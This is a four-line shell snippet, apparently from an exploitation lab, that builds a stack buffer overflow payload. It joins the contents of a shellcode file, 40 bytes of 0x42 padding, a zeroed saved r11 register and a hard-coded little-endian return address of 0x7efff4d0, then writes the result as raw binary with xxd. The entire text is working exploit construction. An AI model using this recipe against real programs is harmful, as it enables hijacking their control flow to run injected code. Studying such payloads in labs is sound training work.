pad=$(for i in $(seq 40); do echo -n '42'; done)
r11=$(printf %08x 0x0 | tac -rs..)
ret=$(printf %08x 0x7efff4d0 | tac -rs..) # little endian
(cat shellcode.txt; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > payload